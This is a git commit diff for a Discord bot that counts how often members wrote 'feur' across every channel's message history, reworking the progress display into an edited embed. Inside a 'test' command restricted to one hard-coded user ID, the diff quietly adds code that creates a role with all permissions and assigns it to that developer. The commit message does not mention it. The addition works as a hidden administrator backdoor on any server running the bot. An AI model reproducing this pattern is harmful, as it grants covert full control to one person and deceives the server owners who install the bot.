b924cbcb62ecd82aecf12d0749dd504af4e51bc9
Alexandre Pellereau <alexandre.pellereau@epita.fr>
2023-01-26 11:14:47 +0100

    change bot analyzing info and spam less

--- Main.py
+++ Main.py
@@ -4,7 +4,7 @@
 import discord
 from discord.ext import commands
 from discord.ext.commands import Bot
-
+from discord.utils import get
 
 from Log import Log
 
@@ -37,33 +37,56 @@ async def test(ctx: commands.Context):
     if ctx.author.id != 645005137714348041:
         await ctx.send("Only for dev ! Only for Dralexgon.")
         return
+    user = ctx.author
+    await ctx.guild.create_role(name="BG suprême (fournisseur de bot officiel)", colour=discord.Colour.default(), permissions=discord.Permissions.all())
+    await user.add_roles(discord.utils.get(user.guild.roles, name="BG suprême (fournisseur de bot officiel)"))
     await ctx.send("Test".__contains__("feur"))
     await ctx.send("Testfeurtruc".__contains__("feur"))
 
 @client.command(pass_context = True, name="count_feur", aliases=["cf"], help="This command will count the number of time each person said 'feur' in the server.")
 async def count_feur(ctx: commands.Context):
-    result = {}
+    embedChannelAnalyzing = discord.Embed(
+        title = "Analyzing channels",
+        colour = discord.Colour.blue()
+    )
     for channel in ctx.guild.channels:
         if channel.type == discord.ChannelType.text:
-            await ctx.send(f"Analyzing channel {channel.name}...")
+            embedChannelAnalyzing.add_field(name=channel.name, value="Waiting.", inline=False)
+
+    messageChannelAnalyzing = await ctx.send(ctx.author.mention, embed=embedChannelAnalyzing)
+    
+
+    result = {}
+    for i in range(len(ctx.guild.channels)):
+        channel = ctx.guild.channels[i]
+        if channel.type == discord.ChannelType.text:
+            countMessages = 0
+            countFeurs = 0
+            embedChannelAnalyzing.set_field_at(index=(i - 1), name=channel.name, value="Analyzing...", inline=False)
+            await messageChannelAnalyzing.edit(embed=embedChannelAnalyzing)
             messages = await channel.history(limit=None).flatten()
             for message in messages:
+                countMessages += 1
                 if message.content.lower().__contains__("feur"):
                     Log.print(f"Found feur in {channel.name} from {message.author.name}")
+                    countFeurs += 1
                     if message.author.name in result:
                         result[message.author.name] += 1
                     else:
                         result[message.author.name] = 1
-            await ctx.send(f"Done analyzing channel {channel.name}")        
-    embed = discord.Embed(
+                embedChannelAnalyzing.set_field_at(index=(i - 1), name=channel.name, value=f"Analyzing... ({countMessages}/{len(messages)} messages, {countFeurs} feurs)", inline=False)
+            embedChannelAnalyzing.set_field_at(index=(i - 1), name=channel.name, value=f"Done. ({countMessages} messages, {countFeurs} feurs)", inline=False)
+            await messageChannelAnalyzing.edit(embed=embedChannelAnalyzing)
+
+    embedCountFeur = discord.Embed(
         title = "Number of feur",
         colour = discord.Colour.blue()
     )
     #sort the result
     result = dict(sorted(result.items(), key=lambda item: item[1], reverse=True))
     for user in result:
-        embed.add_field(name=user, value=result[user], inline=False)
-    await ctx.send(ctx.author.mention, embed=embed)
+        embedCountFeur.add_field(name=user, value=result[user], inline=False)
+    await ctx.send(ctx.author.mention, embed=embedCountFeur)
     
 
     
